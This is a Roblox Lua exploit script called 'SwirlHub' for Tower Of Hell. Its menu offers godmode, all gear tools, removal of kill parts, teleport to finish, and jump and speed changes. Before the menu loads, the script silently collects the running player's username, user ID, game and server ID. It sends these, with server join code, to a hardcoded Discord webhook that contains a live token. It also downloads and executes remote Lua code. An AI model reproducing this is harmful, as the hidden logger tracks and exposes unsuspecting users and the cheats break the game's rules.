local webhookURL = "https://discord.com/api/webhooks/1333133574412435467/dJtOBcbl4SuIv_2J05Ua3KS5C0y3a7SHI9D2sfVY_lEEf426Io_bt_xGNfy57mMVxl--"

local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()

local jsJoinCode = [[
    fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
        const server = json.data.find(s => s.id === "]] .. jobId .. [[");
        if (server) {
            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
        } else {
            console.log("Server not found.");
        }
    });
]]

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]

local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["color"] = 0x000000, 
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
        { ["name"] = "JavaScript Join Code", ["value"] = "```js\n" .. jsJoinCode .. "\n```", ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})

local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    warn("Your executor does not support HTTP requests.")
end


local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "SwirlHub - Tower Of Hell " .. Fluent.Version,
    SubTitle = "by Flames",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local Options = Fluent.Options

local function enableGodmode()
    for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
        if v.ClassName == 'Part' then
            local fb = v:FindFirstChild('TouchInterest')
            if fb then
                fb:Destroy()
            end
        end
    end
    warn('godmode is ready. if u reset, dont re-execute, it will reload automatically')

    game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
        for i, v in pairs(char:GetChildren()) do
            if v.ClassName == 'Part' then
                local fb = v:FindFirstChild('TouchInterest')
                if fb then
                    fb:Destroy()
                end
            end
        end
        warn('godmode is auto reloaded')
    end)
end

local function giveAllTools()
    local player = game.Players.LocalPlayer
    local gearsFolder = game.ReplicatedStorage:FindFirstChild("Gear")
    
    if gearsFolder then
        for _, tool in pairs(gearsFolder:GetChildren()) do
            if tool:IsA("Tool") then
                tool:Clone().Parent = player.Backpack
            end
        end
        warn('All tools have been added to your character.')
    else
        warn('Gear folder not found in ReplicatedStorage.')
    end
end

local function setGlobalJumps(value)
    local globalJumps = game.ReplicatedStorage:FindFirstChild("globalJumps")
    
    if globalJumps and globalJumps:IsA("IntValue") then
        globalJumps.Value = value
        warn('globalJumps value set to ' .. value)
    else
        warn('globalJumps IntValue not found in ReplicatedStorage.')
    end
end

local function setGlobalSpeed(value)
    local globalSpeed = game.ReplicatedStorage:FindFirstChild("globalSpeed")
    
    if globalSpeed and globalSpeed:IsA("NumberValue") then
        globalSpeed.Value = value
        warn('globalSpeed value set to ' .. value)
    else
        warn('globalSpeed NumberValue not found in ReplicatedStorage.')
    end
end

local function removeKillParts()
    local count = 0
    for _, part in pairs(game.Workspace:GetDescendants()) do
        if part:IsA("BasePart") and (part.Name == "kill" or part.Name == "killPart") then
            part:Destroy()
            count = count + 1
        end
    end
    warn(count .. " parts named 'kill' or 'killPart' have been removed from Workspace.")
end



do

    Tabs.Main:AddButton({
        Title = "Activate Godmode",
        Description = "Enable godmode for your character",
        Callback = function()
            Window:Dialog({
                Title = "Activate Godmode",
                Content = "Are you sure you want to activate godmode?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                            enableGodmode()
                            print("Godmode activated.")
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                            print("Activation cancelled.")
                        end
                    }
                }
            })
        end
    })

	Tabs.Main:AddButton({
    Title = "Remove All Kill Parts",
    Description = "Removes all parts named 'Kill' from the entire Workspace",
    Callback = function()
        Window:Dialog({
            Title = "Remove Kill Parts",
            Content = "Are you sure you want to remove all parts named 'Kill' from Workspace?",
            Buttons = {
                {
                    Title = "Confirm",
                    Callback = function()
                        removeKillParts()
                        print("All 'Kill' parts removed.")
                    end
                },
                {
                    Title = "Cancel",
                    Callback = function()
                        print("Removal cancelled.")
                    end
                }
            }
        })
    end
})


    Tabs.Main:AddButton({
        Title = "Give All Tools",
        Description = "Give all tools from the Gear folder to your character",
        Callback = function()
            Window:Dialog({
                Title = "Give All Tools",
                Content = "Are you sure you want to give all tools to your character?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                            giveAllTools()
                            print("All tools given to character.")
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function()
                            print("Tool giving cancelled.")
                        end
                    }
                }
            })
        end
    })

	local function teleportToFinish()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local finishGlow = game.Workspace:FindFirstChild("tower")
        and game.Workspace.tower.sections.finish:FindFirstChild("FinishGlow")

    if finishGlow and character then
        local finishPosition = finishGlow.CFrame * CFrame.new(0, -5, 0)
        character.HumanoidRootPart.CFrame = finishPosition
        warn("Teleported to the finish.")
    else
        warn("FinishGlow or character not found.")
    end
end

Tabs.Main:AddButton({
    Title = "Teleport to Finish",
    Description = "Teleport directly to the finish, slightly below the roof",
    Callback = function()
        Window:Dialog({
            Title = "Teleport to Finish",
            Content = "Are you sure you want to teleport to the finish?",
            Buttons = {
                {
                    Title = "Confirm",
                    Callback = function()
                        teleportToFinish()
                        print("Teleported to finish.")
                    end
                },
                {
                    Title = "Cancel",
                    Callback = function()
                        print("Teleportation cancelled.")
                    end
                }
            }
        })
    end
})


    local Toggle = Tabs.Main:AddToggle("GlobalJumpsToggle", {Title = "Infinite Jump", Default = false})

    Toggle:OnChanged(function()
        if Options.GlobalJumpsToggle.Value then
            setGlobalJumps(999)
        else
            setGlobalJumps(0)
        end
        print("Toggle changed:", Options.GlobalJumpsToggle.Value)
    end)

    Options.GlobalJumpsToggle:SetValue(false)

    local SpeedSlider = Tabs.Main:AddSlider("SpeedSlider", {
        Title = "Walkspeed",
        Description = "Adjust your walkspeed",
        Default = 16,
        Min = 0,
        Max = 100,
        Rounding = 0,
        Callback = function(Value)
            setGlobalSpeed(Value)
            print("Slider was changed:", Value)
        end
    })

    SpeedSlider:OnChanged(function(Value)
        setGlobalSpeed(Value)
        print("Slider changed:", Value)
    end)

    SpeedSlider:SetValue(16)

end


SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({})

InterfaceManager:SetFolder("SwirlHub")
SaveManager:SetFolder("Swirlhub/TowerOfHell")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title = "SwirlHub",
    Content = "The script has been loaded.",
    Duration = 8
})

SaveManager:LoadAutoloadConfig()
